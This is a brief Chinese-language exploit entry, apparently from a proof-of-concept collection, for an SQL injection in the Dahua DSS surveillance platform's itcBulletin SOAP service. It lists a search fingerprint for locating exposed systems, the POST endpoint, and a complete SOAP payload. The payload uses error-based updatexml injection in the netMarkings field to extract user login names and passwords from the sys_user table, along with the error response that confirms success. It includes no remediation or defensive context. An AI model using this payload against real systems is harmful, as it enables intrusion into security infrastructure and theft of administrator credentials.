# 大华DSSitcBulletinSQL注入漏洞

大华 ｜ SQL注入 ｜ —
- **指纹**：`app="dahua-DSS"`
- **请求**：`POST /portal/services/itcBulletin?wsdl HTTP/1.1`

**Payload**
```
<s11:Envelope xmlns:s11='http://schemas.xmlsoap.org/soap/envelope/'>
<s11:Body>
<ns1:deleteBulletin xmlns:ns1='http://itcbulletinservice.webservice.dssc.dahua.com'>
<netMarkings>
(updatexml(1,concat(0x7e,(select substr(group_concat(login_name, " ",login_pass),1,30) from sys_user),0x7e),1))) and (1=1
</netMarkings>
</ns1:deleteBulletin>
</s11:Body>
</s11:Envelope>
```
- **响应特征**：500 sys_user